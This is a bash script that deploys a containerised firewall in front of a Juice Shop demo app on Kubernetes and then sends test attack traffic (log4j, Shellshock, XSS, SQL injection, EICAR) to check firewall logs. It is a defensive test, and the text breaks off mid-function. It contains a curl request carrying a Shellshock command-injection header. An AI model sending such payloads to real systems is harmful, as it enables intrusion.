#!/bin/bash  -e


function cleancfoslog() {
  local logfiles=("${@:1:$#-2}") # Capture all but the last two arguments as log files
  local label="${@:$#-1:1}"      # Second-to-last argument
  local number="${@:$#:1}"       # Last argument
  label="${label:-app=firewall}" # Apply default value if label is empty
  number="${number:-1}"          # Apply default value if number is empty
  local cfos_pod_name=$(kubectl get pods -l "$label" -o jsonpath='{.items[?(@.status.phase=="Running")].metadata.name}')

  if [[ -n "$cfos_pod_name" ]]; then
    for file in "${logfiles[@]}"; do
runcli RED kubectl exec -it "po/${cfos_pod_name}" -c cfos -- sh -c ": > /var/log/log/$file"

    done
  else
    echo "Error: No running pod found with label '$label'"
  fi
}


function gke_network_policy_allow_default_security_namespace() {

filename="allowdefaultnamespacetosecuirtynamespace.yaml" 
cat << EOF > $filename
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-backend-to-juiceshop-service
  namespace: security
spec:
  podSelector:
    matchLabels:
      app: juiceshop
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: default # Allow traffic from default namespace
    ports:
    - protocol: TCP
      port: 3000
EOF

runcli GREEN kubectl apply -f $filename
} 

function get_kube_config() {
runcli GREEN get_gkecluster_credentail my-first-cluster-1 us-central1-a  && exit 0        
echo no available GKE cluster, try azure
runcli GREEN az aks get-credentials -g  cfosdemowandy  -n $(whoami)-aks-cluster --overwrite-existing  && exit 0
}

function get_gkecluster_credentail() {
local clustername="${1-:my-first-cluster-1}"
local zone="${2-:us-central1-a}"
runcli GREEN gcloud components install gke-gcloud-auth-plugin || echo install failed
runcli GREEN gcloud container clusters get-credentials $clustername --zone $zone

}


function demo_managedk8s() {

runcli GREEN echo "start at $(date)" 


local uluster_type=$1
if [[ -z $cluster_type ]]; then 
kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kubeletVersion' | grep -q "gke" && cluster_type="gke"

kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kernelVersion' | grep -q "azure" && cluster_type="aks"

fi


case "$cluster_type" in
    "eks")
      ;;
    "aks")
     #create_aks_cluster "westus" "cfosdemowandy" || echo create_aks_cluster failed 
     add_label_to_node "kubernetes.io/os=linux" "security=true" "app=true" || echo command skipped 
      ;;
    "gke")
     get_gkecluster_credentail my-first-cluster-1 us-central1-a 
     add_label_to_node "kubernetes.io/os=linux" "security=true" "app=true" || echo command skipped 
      ;;
    *)
      ;;
esac


CFOSLICENSEYAMLFILE="cfos_license.yaml"
applyCFOSLicense || exit 1

deploy_cfos_with_agent "cfos7210250-deployment-new"  || exit 1


#updatecFOSsignuatre 

create_ingress_demo || echo create_ingress_demo exit

create_internallb_juiceshop_new $cluster_type
runcli GREEN kubectl wait --for=jsonpath='{.status.loadBalancer.ingress[0].ip}' --timeout=5m service/cfosvipjuiceshopinternal

create_externallb_juiceshop $cluster_type
 #service.beta.kubernetes.io/azure-dns-label-name: cfostestjuiceshop


runcli GREEN kubectl wait --for=jsonpath='{.status.loadBalancer.ingress[0].ip}' --timeout=5m service/cfosvipjuiceshopexternal

runcli CYAN echo now update cFOS signiture and clean up old logs 

updatecFOSsignuatre 

log_files=("traffic.0" "ips.0" "virus.0" "app.0" "webf.0")
cleancfoslog "${log_files[@]}" "app=firewall" 3


#cfostestjuiceshop.westus.cloudapp.azure.com


#        log_files=("traffic.0" "ips.0" "virus.0" "app.0" "webf.0")
#        check_cFOS_log "${log_files[@]}" "app=firewall" 1


runcli CYAN echo "now running ingress security use case -ingress traffic from backend namespace to security namespace in same cluster (east-west use case )"  

attacktype=("normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection" "normalfileupload" "segdownload" "eicarupload") 

sendattack_to_headlesssvc_cfos "${attacktype[@]}"  

        log_files=("traffic.0") 
        check_cFOS_log "${log_files[@]}" "app=firewall" 1

        log_files=( "ips.0" ) 

        check_cFOS_log "${log_files[@]}" "app=firewall" 5 

        log_files=( "virus.0" "app.0" )

        check_cFOS_log "${log_files[@]}" "app=firewall" 2 

runcli CYAN echo "now running ingress security use case -traffic destinated to both internal and exernal loadbalancer address which use cFOS VIP as backend" 


        send_traffic_to_lb "app=diag2" "backend" "ip" "log4j" 
        send_traffic_to_lb "app=diag2" "backend" "ip" "shellshock" 
        send_traffic_to_lb "app=diag2" "backend" "ip" "xss"

        log_files=("ips.0" )
        check_cFOS_log "${log_files[@]}" "app=firewall" 9


#traffic directly to juiceshop svc is allowed and not protected by ingress security but will be protected by egress security 

runcli CYAN echo "now running egress security use case -egress traffic from one namespace to other namespace in same cluster (east-west use case )"

attacktype=("normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection")  

sendattack_to_clusteripsvc "juiceshop-service" "security" "${attacktype[@]}" || echo "sendattack_to_clusteripsvc failed"


 
runcli CYAN echo now runnning egressse security use case -webfiltering 
urllist=("https://www.fortiguard.com/wftest/26.html" "https://120.wap517.biz" "https://www.casino.org") 
send_waf_attack "app=diag2" "backend" "${urllist[@]}" || echo send_waf_attack exit

log_files=("webf.0")
check_cFOS_log "${log_files[@]}" "app=firewall" 3

runcli CYAN echo now runnning egressse security use case - malicious traffic to external website

attacktype=("normal" "log4j" "shellshock")

       for attack in "${attacktype[@]}" ; do
          send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" "https://www.hackthebox.com/"
       done

log_files=("ips.0")
check_cFOS_log "${log_files[@]}" "app=firewall" 2

 
runcli GREEN echo stop at $(date)  

}

function runcli() {
  local NC='\033[0m'
  local color_code="" # Default: no specific color code

  local color_name_upper
  color_name_upper=$(echo "$1" | tr '[:lower:]' '[:upper:]')

  case "$color_name_upper" in
    GREEN)   color_code='\033[0;32m' ;;
    YELLOW)  color_code='\033[0;33m' ;;
    RED)     color_code='\033[0;31m' ;;
    BLUE)    color_code='\033[0;34m' ;;
    MAGENTA) color_code='\033[0;35m' ;;
    CYAN)    color_code='\033[0;36m' ;;
    *)
      # Invalid color name provided
      echo "Warning: Invalid color '$1'. Using default terminal color." >&2
      # color_code remains empty
      ;;
  esac

  shift

  if [[ -n "$color_code" ]]; then
    printf "${color_code}"
  fi

  printf "Executing:" # Print prefix
  printf " %s" "$@"  # Print the command and all its arguments (which are now in "$@")

  printf "${NC}\n"  # Always reset color (harmless if no color was set)

  "$@"
  local exit_status=$? # Capture exit status immediately

  return $exit_status
}

myaz() {
  local GREEN='\033[0;32m'
  local NC='\033[0m' # No Color
  printf "${GREEN}Executing: az"
  printf " %s" "$@"
  printf "${NC}\n"
  az "$@"
  local exit_status=$?
  return $exit_status
}



function send_traffic_to_lb() {
local podlabel="${1:-app=diag2}"
local podnamespace="${2:-backend}"
local ingresstype="${3:-hostname}"
local attack="${4:-normal}"
internalslbname=$(kubectl get svc cfosvipjuiceshopinternal -o json | jq -r .status.loadBalancer.ingress[].$ingresstype)
externalslbname=$(kubectl get svc cfosvipjuiceshopexternal -o json | jq -r .status.loadBalancer.ingress[].$ingresstype)
podname=$(kubectl get pod -l $podlabel -n $podnamespace -o json  | jq -r .items[0].metadata.name)


send_attack_traffic $podlabel $podnamespace 'cfostest-vip-juiceshop' 'default' $attack "ips.0" "http://${internalslbname}:3000"

send_attack_traffic $podlabel $podnamespace 'cfostest-vip-juiceshop' 'default' $attack "ips.0" "http://${externalslbname}:3000"


runcli GREEN echo send traffic  from internet address

runcli GREEN curl -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls" http://$externalslbname:3000 || echo blocked
} 

function create_ingress_demo() {

      cfosClusterIPAddress=$(kubectl get svc kube-dns -n kube-system -o jsonpath='{.spec.clusterIP}' | cut -d'.' -f1-3 | sed 's/$/.253/')
      juiceshopClusterIPAddress=$(kubectl get svc kube-dns -n kube-system -o jsonpath='{.spec.clusterIP}' | cut -d'.' -f1-3 | sed 's/$/.252/')
        deploy_demo_pod $juiceshopClusterIPAddress || exit 1

        svctype="access-proxy"
        #svctype="static-nat"
        create_cfos_headlessvc $cfosClusterIPAddress
        #create_cfos_headlessvc "None"
        create_juiceshop_vip_configmap $juiceshopClusterIPAddress $svctype
        create_juiceshopvip_firewallpolicyconfigmap
}

function send_waf_attack() {
local podlabel="${1:-app=diag2}"
local podnamespace="${2:-backend}"
local urllist=("${@:3}")

for url in "${urllist[@]}"; do 
webftestegress  $podlabel $podnamespace $url 
done

#urllist=("https://www.fortiguard.com/wftest/26.html" "https://120.wap517.biz" "https://www.casino.org")

}


function sendattack_to_clusteripsvc() {

    local targetsvcname="${1:-juiceshop-service}"
    local targetnamespace="${2:-security}"
    local attack_types=("${@:3}")  

    for attack in "${attack_types[@]}"; do
        if [ "$attack" = "eicarupload" ]; then
            send_attack_traffic 'app=diag2' 'backend' "$targetsvcname" "$targetnamespace" "$attack" "virus.0"  || exit 1
        else
            send_attack_traffic 'app=diag2' 'backend' "$targetsvcname" "$targetnamespace" "$attack" "ips.0"  || echo "failed to send traffic"
        fi
    done

} 


function sendattack_to_headlesssvc_cfos() {
   local attack_types=("$@") 
   for attack in "${attack_types[@]}"; do 
    send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" || exit 1
done

}

function create_aks_cluster() {
local location="${1:-westus}"
local resourcegroupname="${2:-cfosdemowandy}"

myaz group create --location $location --resource-group $resourcegroupname

[ ! -f ~/.ssh/id_rsa ] && ssh-keygen -q -N "" -f ~/.ssh/id_rsa

clustername=$(whoami)-aks-cluster
INSTANCETYPE="Standard_D2s_v4" #2vcpu ,8G memory

myaz aks create \
    --resource-group $resourcegroupname \
    --name ${clustername} \
    --node-count 1 \
    --enable-addons monitoring \
    --node-vm-size $INSTANCETYPE \
    --vm-set-type VirtualMachineScaleSets \
    --network-plugin azure \
    --network-policy azure \
    --service-cidr  10.96.0.0/16 \
    --dns-service-ip 10.96.0.10 \
    --enable-node-public-ip \
    --nodepool-name worker \
    --nodepool-labels nested=true linux=true

myaz aks nodepool add \
    --resource-group $resourcegroupname \
    --cluster-name ${clustername} \
    --os-type Linux \
    --node-vm-size $INSTANCETYPE \
    --name ubuntu \
    --enable-node-public-ip \
    --labels nested=true linux=true \
    --node-count 1 

CLIENT_ID=$(az aks show --name $clustername --resource-group $resourcegroupname --query identity.principalId -o tsv)
RG_SCOPE=$(az group show --name $resourcegroupname --query id -o tsv)
az role assignment create \
    --assignee ${CLIENT_ID} \
    --role "Network Contributor" \
    --scope ${RG_SCOPE}

az aks get-credentials -g  $resourcegroupname -n ${clustername} --overwrite-existing
kubectl get node 
}

function add_label_to_node() {

local label1=$1
local label2="${2:-security=true}" 
local label3="${3:-app=true}"

node_names=$(kubectl get nodes -l "${label1}"  -o jsonpath='{.items[*].metadata.name}')

echo $node_names

IFS=' ' read -ra nodes <<< "$node_names"

if [[ ${#nodes[@]} -eq 1 ]]; then
  runcli GREEN kubectl label nodes "${nodes[0]}" "$label2" "$label3" --overwrite
else
  if [[ ${#nodes[@]} -gt 0 ]]; then
    runcli GREEN kubectl label nodes "${nodes[0]}" "$label2"  --overwrite
    for ((i=1; i<${#nodes[@]}; i++)); do
      runcli GREEN kubectl label nodes "${nodes[$i]}" "$label3" --overwrite
    done
  fi
fi


}

function deploy_cfos() {

deploymentname="cfos7210250-deployment-new"

#--set nodeSelector=null to disable select node based on label 

kube_dns_ip=$(kubectl get svc kube-dns -n kube-system -o jsonpath='{.spec.clusterIP}')
helm repo add cfos-chart https://yagosys.github.io/cfos-chart
helm repo update
helm search repo cfos-chart
helm upgrade --install $deploymentname cfos-chart/cfos \
  --set routeManager.enabled=false \
  --set dnsConfig.nameserver=$kube_dns_ip \
  --set-string nodeSelector.security="true" \
  --set appArmor.enabled=true

kubectl rollout status deployment $deploymentname
}

function deploy_cfos_with_agent() {
local deploymentname="${1:-cfos7210250-deployment-new}"
local agent_version="${2:-cni0.1.25clusteroute}"    
#CLUSTER_ROUTE_DST="10.96.0.253/32\,10.224.0.0/16"
      
kube_dns_ip=$(kubectl get svc kube-dns -n kube-system -o jsonpath='{.spec.clusterIP}')
cfosClusterIPAddress=$(kubectl get svc kube-dns -n kube-system -o jsonpath='{.spec.clusterIP}' | cut -d'.' -f1-3 | sed 's/$/.253/') 
podCIDR="10.224.0.0/16"
CLUSTER_ROUTE_DST="$cfosClusterIPAddress/32\,$podCIDR"
helm repo add cfos-chart https://yagosys.github.io/cfos-chart
helm repo update
helm search repo cfos-chart
runcli GREEN helm upgrade --install $deploymentname cfos-chart/cfos \
  --set routeManager.enabled=true \
  --set dnsConfig.nameserver=$kube_dns_ip \
  --set-string nodeSelector.security="true" \
  --set-string routeManager.env.CLUSTER_ROUTE_DST=$CLUSTER_ROUTE_DST \
  --set routeManager.image.tag=$agent_version \
  --set appArmor.enabled=true

runcli YELLOW kubectl rollout status deployment $deploymentname
}


function create_internallb_juiceshop_new() {
  local cluster_type="$1"
  local filename="cfosvipjuiceshopinternal.yaml"
  local lb_annotation=""

if [[ -z $cluster_type ]] ; then 
kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kubeletVersion' | grep -q "gke" && cluster_type="gke" 

kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kernelVersion' | grep -q "azure" && cluster_type="aks"

fi 

  case "$cluster_type" in
    "eks")
      lb_annotation='service.beta.kubernetes.io/aws-load-balancer-internal: "true"'
      ;;
    "aks")
      lb_annotation='service.beta.kubernetes.io/azure-load-balancer-internal: "true"'
      ;;
    "gke")
      lb_annotation='cloud.google.com/load-balancer-type: "Internal"'
      ;;
    *)
      echo "Warning: Unknown cluster type '$cluster_type'. Defaulting to no internal load balancer annotation."
      ;;
  esac

  cat << EOF > "$filename"
apiVersion: v1
kind: Service
metadata:
  name: cfosvipjuiceshopinternal
  namespace: default
  annotations:
EOF
  if [ -n "$lb_annotation" ]; then
    cat << EOF >> "$filename"
    $lb_annotation
EOF
  fi
cat << EOF >> "$filename"
spec:
  selector:
    app: firewall
  ports:
    - protocol: TCP
      port: 3000    # The port that the service will expose
      targetPort: 3000 # The port on the Pod that the service should forward traffic to
  type: LoadBalancer    # Specify that this service is of type LoadBalancer
  sessionAffinity: ClientIP
EOF
runcli GREEN  kubectl apply -f "$filename"
}

function create_internallb_juiceshop() {
filename="cfosvipjuiceshopinternal.yaml"
cat << EOF > $filename
apiVersion: v1
kind: Service
metadata:
  name: cfosvipjuiceshopinternal
  namespace: default
  annotations:
    service.beta.kubernetes.io/aws-load-balancer-internal: "true"  # Indicates internal LB
spec:
  selector:
    app: firewall
  ports:
    - protocol: TCP
      port: 3000         # The port that the service will expose
      targetPort: 3000   # The port on the Pod that the service should forward traffic to
  type: LoadBalancer      # Specify that this service is of type LoadBalancer
  sessionAffinity: ClientIP
EOF
runcli GREEN kubectl apply -f $filename
}

function create_externallb_juiceshop() {
filename="cfosvipjuiceshopexternal.yaml"
local cluster_type="$1" 
if [[ -z $cluster_type ]] ; then
kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kubeletVersion' | grep -q "gke" && cluster_type="gke"

kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kernelVersion' | grep -q "azure" && cluster_type="aks"

fi

  case "$cluster_type" in
    "eks")
      lb_annotation='service.beta.kubernetes.io/aws-load-balancer-internal: "true"'
      ;;
    "aks")
      lb_annotation='service.beta.kubernetes.io/azure-load-balancer-internal: "true"'
      ;;
    "gke")
      lb_annotation='cloud.google.com/load-balancer-type: "Internal"'
      local dnslabel="service.beta.kubernetes.io/azure-dns-label-name: cfostest"
      ;;
    *)
      echo "Warning: Unknown cluster type '$cluster_type'. Defaulting to no internal load balancer annotation."
      ;;
  esac


cat << EOF > $filename
apiVersion: v1
kind: Service
metadata:
  name: cfosvipjuiceshopexternal
  namespace: default
  annotations: 
    $dnslabel
spec:
  selector:
    app: firewall
  ports:
    - protocol: TCP
      port: 3000         # The port that the service will expose
      targetPort: 3000   # The port on the Pod that the service should forward traffic to
  type: LoadBalancer      # Specify that this service is of type LoadBalancer
  sessionAffinity: ClientIP
EOF
runcli GREEN kubectl apply -f $filename
}


function create_cfos_headlessvc() {
local cfosClusterIPAddress=$1
filename1="cfosheadless.yaml"
cat << EOF > $filename1
apiVersion: v1
kind: Service
metadata:  
  name: cfostest-vip-juiceshop
spec:
  clusterIP: $cfosClusterIPAddress
  sessionAffinity: ClientIP
  selector:
    app: firewall
  ports:    
    - protocol: TCP
      port: 3000
      targetPort: 3000

EOF
runcli GREEN kubectl apply -f $filename1  || echo kubectl apply -f $filename1 failed
}

function create_juiceshop_vip_configmap() {
	local juiceshopclusterip=$1
	local svctype=$2
filename2=cfosconfigmapforjuiceshop.yaml
cfosnamespace="default"
svcnamespace="security"
svcname="juiceshop-service"
svctype="${2:-access-proxy}"
if [[ -z $juiceshopclusterip ]]; then
juiceshopclusterip=$(kubectl get svc $svcname -n $svcnamespace -o json | jq -r .spec.clusterIP)
fi 
juiceshopvipname="juiceshop"
echo $juiceshopclusterip
cat << EOF > $filename2
apiVersion: v1
kind: ConfigMap
metadata:
  name: cfosconfigvipjuiceshop
  labels:
      app: fos
      category: config
data:
  type: partial
  config: |-
    config firewall vip
           edit $juiceshopvipname
            set extip "cfostest-vip-juiceshop.$cfosnamespace.svc.cluster.local"
            set type $svctype
            set service "ALL"
            set mappedip $juiceshopclusterip
            set extintf "eth0"
            set portforward enable
            set extport "3000"
            set mappedport "3000"
           next
       end
EOF

runcli GREEN kubectl apply -f $filename2  -n $cfosnamespace || echo kubectl apply -f $filename2 -n $cfosnamespace failed
#$curl http://cfostest-vip-juiceshop.default.svc.cluster.local 3000
}

function create_juiceshopvip_firewallpolicyconfigmap() {

filename3="cfosconfigmapjuiceshopfirewallpolicyforvip.yaml"
cfosnamespace="default"
juiceshopvipname="juiceshop"

cat << EOF >$filename3
apiVersion: v1
kind: ConfigMap
metadata:
  name: cfosconfigpolicyforjuiceshopvip
  labels:
      app: fos
      category: config
data:
  type: partial
  config: |-
    config firewall ssl-ssh-profile
        edit "mytest"
           set server-cert "Device"
        next
    end
    config application list
      edit "default"
        set comment "block http file upload"
        set extended-log enable
          config entries
             edit 1
                set category 15
                set application 18123
                set action block
             next
             edit 2
                set category 15
                set application 17136
                set action block
             next
          end
      next
    end 
    config application list
      edit "demo1"
        set comment "block http file upload"
        set extended-log enable
          config entries
             edit 1
                set category 15
                set application 18123
                set action block
             next
             edit 2
                set category 15
                set application 17136
                set action block
             next
          end
      next
    end
    config firewall policy
           edit 10
            set name $juiceshopvipname
            set utm-status enable
            set srcintf "eth0"
            set dstintf "eth0"
            set srcaddr "all"
            set dstaddr $juiceshopvipname
            set ssl-ssh-profile "mytest"
            set av-profile "default"
            set ips-sensor "default"
            set webfilter-profile "default"
            set application-list "demo1"
            set logtraffic all
            set nat enable
           next
       end
EOF
runcli GREEN kubectl apply -f $filename3 -n $cfosnamespace || echo kubectl apply -f $filename3 -n $cfosnamespace failed
}


function deleteingressyaml() {
	kubectl delete -f $filename1
	kubectl delete -f $filename2
	kubectl delete -f $filename3
	
}

function reapplycfoslicense() {
        local cfoslicname=${CFOSLICENSEYAMLFILE}
	kubectl delete -f $cfoslicname || echo failed to delete license file $cfoslicname
	cfospodname=$(kubectl get pod -l app=firewall -o json | jq -r .items[].metadata.name)
	kubectl delete po/$cfospodname || echo kubectl delete po/$cfospodname failed 
	kubectl apply -f $cfoslicname
}

function webftestegress() {
	 local pod_label_selector="${1:-app=diag}"
	 local pod_namespace="${2:-default}"
	 local url="${3:-https://www.fortiguard.com/wftest/26.html}"

	 #echo $pod_namespace
	 #echo $pod_label_selector 
	 #echo kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}'
	 POD_NAME=$(kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')

    if [ -z "$POD_NAME" ]; then
        echo "No pod found with label '$pod_label_selector' in namespace '$pod_namespace'" && exit 1
    fi
	#echo kubectl exec -it "$POD_NAME" -n $pod_namespace -- curl -k $url
	runcli GREEN kubectl exec -it "$POD_NAME" -n $pod_namespace -- curl -I -k $url || echo failed to run
}


function install_latest_aws_cli() {
  # 1. Check system architecture
if [ "$(uname -o)" = "Darwin" ]; then
    HOMEBREW_NO_AUTO_UPDATE=1 brew upgrade awscli || echo "Failed to upgrade awscli. Command: HOMEBREW_NO_AUTO_UPDATE=1 brew upgrade awscli"
fi


  architecture=$(uname -m)


  case "$architecture" in
    aarch64*)
      arch="arm64"
      ;;
    x86_64*)
      arch="x86_64"
      ;;
    *)
      echo "Unsupported architecture: $architecture"
      echo "This script only supports installDep on  aarch64 and x86_64 with a linux system."
      echo "for mac system, try install eksctl, awscli, helm etc on your own"
      echo "Detected architecture: $arch" on os is $(uname -o)
      return 1 # Indicate failure
      ;;
  esac

  echo "Detected architecture: $arch" on os is $(uname -o)

  # 2. Check if aws command exists and get its location
  aws_path=$(command -v aws) || echo check aws exist

  if [ -n "$aws_path" ]; then
    echo "Existing AWS CLI installation found at: $aws_path"
    read -p "Do you want to upgrade the existing AWS CLI installation in place? (y/n): " confirm_upgrade
    confirm_upgrade=$(echo "$confirm_upgrade" | tr '[:upper:]' '[:lower:]') # Make case-insensitive

    if [ "$confirm_upgrade" != "y" ]; then
      echo "Upgrade cancelled. Exiting."
      return 0 # Indicate script exited normally, no error
    fi
    install_dir=$(dirname "$aws_path") # Get the directory of existing aws command
    install_dir=$(dirname "$install_dir") # AWS CLI usually installed under /usr/local/bin/aws, so get /usr/local
    install_prefix="$install_dir"
    echo "Proceeding with upgrade in place at: $install_prefix"

  else
    echo "No existing AWS CLI installation found."
    default_install_prefix="/usr/local"
    install_prefix="$default_install_prefix"
    echo "Installing to default location: $install_prefix/aws-cli"
  fi

  # 3. Download and install latest AWS CLI
  temp_dir=$(mktemp -d)
  trap "rm -rf '$temp_dir'" EXIT # Cleanup temp dir on exit

  download_url="https://awscli.amazonaws.com/awscli-exe-linux-${arch}.zip"
  zip_file="$temp_dir/awscli-bundle.zip"

  echo "Downloading AWS CLI from: $download_url"
  if ! curl -s -L -o "$zip_file" "$download_url"; then
    echo "Error downloading AWS CLI. Please check your internet connection or the URL."
    return 1 # Indicate failure
  fi

  echo "Installing AWS CLI..."
  unzip -qq "$zip_file" -d "$temp_dir"

  if ! sudo "$temp_dir/aws/install" \
      --install-dir "$install_prefix/aws-cli" \
      --bin-dir "$install_prefix/bin" ; then
    echo "Error during AWS CLI installation."
    echo "Please check the error messages above or try running the install script manually from '$temp_dir/aws/'"
    return 1 # Indicate failure
  fi

  echo "AWS CLI installed successfully to $install_prefix/aws-cli and executable linked in $install_prefix/bin"
  echo "You may need to close and reopen your terminal or source your profile (e.g., 'source ~/.bashrc' or 'source ~/.zshrc') to ensure the 'aws' command is available in your PATH."
  return 0 # Indicate success
}

saveVariableForEdit() {
    local region="${1:-default}"  
    local output_file="config_${region}.sh"

    # Set all variables first using existing functions
#    if [ "$region" == "china" ]; then
#        set_china_aws_variable
#    else
#        set_global_aws_variable
#    fi

    # Create the configuration file
    {
        echo "#!/bin/bash"
        echo "# Configuration file for $region region"
        echo "# Generated on $(date)"
        echo "# This file can be edited and sourced back into the script"
        echo ""
        
        echo "# Common Variables"
        echo "# ----------------"
        echo "export EKSVERSION=\"$EKSVERSION\""
        echo "export CLUSTERNAME=\"$CLUSTERNAME\""
        echo "export ISPRIVATE=\"$ISPRIVATE\""
        echo "export DNS_IP=\"$DNS_IP\""
        echo "export SERVICEIPV4CIDR=\"$SERVICEIPV4CIDR\""
        echo "export DESIREDWORKERNODESIZE=\"$DESIREDWORKERNODESIZE\""
        echo "export CFOSLICENSEYAMLFILE=\"$CFOSLICENSEYAMLFILE\""
        echo "export ALTERNATIVEDOWNLOADURL=\"$ALTERNATIVEDOWNLOADURL\""
        echo "export CFOSHELMREPO=\"$CFOSHELMREPO\""
        echo "export DEMOCFOSFIREWALLPOLICY=\"$DEMOCFOSFIREWALLPOLICY\""
        echo "export DST_IP_TOCHECK=\"$DST_IP_TOCHECK\""
        echo "export DST_TCP_PORT_TOCHECK=\"$DST_TCP_PORT_TOCHECK\""
        
        echo ""
        echo "# Region-Specific Variables for $region"
        echo "# ----------------"
        echo "export AWS_PROFILE=\"$AWS_PROFILE\""
        echo "export AWS_REGION=\"$AWS_REGION\""
        echo "export EC2_SERVICE=\"$EC2_SERVICE\""
        echo "export IAM_PREFIX=\"$IAM_PREFIX\""
        
	echo "#helm Varible"
	echo "# -----------------"
	echo "export deployScaledObjectwithhelmchart=\"$deployScaledObjectwithhelmchart\""
	echo "export deployPVCwithhelmchart=\"$deployPVCwithhelmchart\""
	echo "export cFOSDeployKind=\"$cFOSDeployKind\""
	echo "export storageClass=\"$storageClass\""

        # Add MYIMAGEREPO only for China region
        if [ "$region" == "china" ]; then
            echo "export MYIMAGEREPO=\"$MYIMAGEREPO\""
        fi

        echo ""
        echo "# All variables are now exported"
        
    } > "$output_file"

    echo "Configuration saved to $output_file"
    echo "You can:"
    echo "1. Edit the file: vi $output_file"
    echo "2. Source it back: source $output_file"

    # Make the file executable
    chmod +x "$output_file"
}

get_env_or_default() {
    local env_var="$1"      # Environment variable name
    local default_val="$2"  # Default value
    local description="$3"  # Description for logging

    if [ ! -z "${!env_var}" ]; then
        echo >&2 "✅ Using $description from environment: ${!env_var}"
        printf "%s" "${!env_var}"
    else
        echo >&2 "Using default $env_var, $description: $default_val"
        printf "%s" "$default_val"
    fi
}

# Set common variables used by both regions

set_common_variables() {
    # Get values from environment or use defaults
    EKSVERSION=$(get_env_or_default \
        "EKSVERSION" \
        "1.31" \
        "EKS Version")

    CLUSTERNAME=$(get_env_or_default \
        "CLUSTERNAME" \
        "democluster" \
        "Cluster Name")

    ISPRIVATE=$(get_env_or_default \
        "ISPRIVATE" \
        "false" \
        "Is Private")

    DNS_IP=$(get_env_or_default \
        "DNS_IP" \
        "10.96.0.10" \
        "DNS IP")

    SERVICEIPV4CIDR=$(get_env_or_default \
        "SERVICEIPV4CIDR" \
        "10.96.0.0/16" \
        "Service IPv4 CIDR")

    export AWS_PAGER=""

    DESIREDWORKERNODESIZE=$(get_env_or_default \
        "DESIREDWORKERNODESIZE" \
        "1" \
        "Desired Worker Node Size")

    CFOSLICENSEYAMLFILE=$(get_env_or_default \
        "CFOSLICENSEYAMLFILE" \
        "cfos_license.yaml" \
        "CFOS License YAML File")

    ALTERNATIVEDOWNLOADURL=$(get_env_or_default \
        "CFOS_ALTERNATIVE_URL" \
	"https://cfos-helm-charts.s3.cn-north-1.amazonaws.com.cn" \
        "Alternative Download URL")

    CFOSHELMREPO=$(get_env_or_default \
        "CFOS_HELM_REPO" \
        "https://yagosys.github.io/cfos-chart" \
        "CFOS Helm Repo")

    DEMOCFOSFIREWALLPOLICY=$(get_env_or_default \
        "DEMOCFOSFIREWALLPOLICY" \
        "UTM" \
        "Demo CFOS Firewall Policy")

    DST_IP_TOCHECK=$(get_env_or_default \
        "DST_IP_TOCHECK" \
        "1.0.0.1" \
        "Destination IP to Check")

    DST_TCP_PORT_TOCHECK=$(get_env_or_default \
        "DST_TCP_PORT_TOCHECK" \
        "443" \
        "Destination TCP Port to Check")

    deployScaledObjectwithhelmchart=$(get_env_or_default \
	"deployScaledObjectwithhelmchart" \
	"false" \
	"enable use cfos helm chart to deploy scaledobject")

    deployPVCwithhelmchart=$(get_env_or_default \
	"deployPVCwithhelmchart" \
	"true" \
	"enable use cfos helm chart to deploy PVC")
    cFOSDeployKind=$(get_env_or_default \
	"cFOSDeployKind" \
	"Deployment" \
	"Deployment or DaemonSet")
    storageClass=$(get_env_or_default \
	"storageClass" \
	"local-path" \
	"local-path or gp2")
}

# Set AWS profile and region for aws china
set_china_aws_variable() {
    # Set common variables first
    set_common_variables

    # Set China-specific variables with environment variable support
    export AWS_PROFILE=$(get_env_or_default \
        "AWS_PROFILE" \
        "chinaaws" \
        "AWS Profile")

    AWS_REGION=$(get_env_or_default \
        "AWS_REGION" \
        "cn-north-1" \
        "AWS Region")

    EC2_SERVICE=$(get_env_or_default \
        "EC2_SERVICE" \
        "ec2.amazonaws.com.cn" \
        "EC2 Service Endpoint")

    IAM_PREFIX=$(get_env_or_default \
        "IAM_PREFIX" \
        "arn:aws-cn" \
        "IAM Prefix")

    MYIMAGEREPO=$(get_env_or_default \
        "MYIMAGEREPO" \
        "public.ecr.aws/t8s9q7q9" \
        "Image Repository")

    # Verify AWS profile
    if ! check_aws_profile "${AWS_PROFILE}"; then
        exit 1
    fi
}

# Set AWS profile and region for aws global
set_global_aws_variable() {
    # Set common variables first

    if ! command -v aws ; then
        install_latest_aws_cli
    fi

    set_common_variables

    # Set Global-specific variables with environment variable support
    export AWS_PROFILE=$(get_env_or_default \
        "AWS_PROFILE" \
        "default" \
        "AWS Profile")

    AWS_REGION=$(get_env_or_default \
        "AWS_REGION" \
        "us-east-1" \
        "AWS Region")

    EC2_SERVICE=$(get_env_or_default \
        "EC2_SERVICE" \
        "ec2.amazonaws.com" \
        "EC2 Service Endpoint")

    IAM_PREFIX=$(get_env_or_default \
        "IAM_PREFIX" \
        "arn:aws" \
        "IAM Prefix")

    # Verify AWS profile
    if ! check_aws_profile "$AWS_PROFILE"; then
        exit 1
    fi
}

function upgradeLatestEKSCTL () {
ARCH=$(uname -m)

# Check if the architecture is either amd64 or arm64
if [ "$ARCH" == "x86_64" ]; then
    ARCH="amd64"
elif [ "$ARCH" == "arm64" ]; then
    ARCH="arm64"
else
    echo "Unsupported architecture: $ARCH. Only amd64 and arm64 are supported."
    exit 1
fi
PLATFORM=$(uname -s)_$ARCH
echo $PLATFORM

# Check if eksctl is already installed and its location
if command -v eksctl &> /dev/null; then
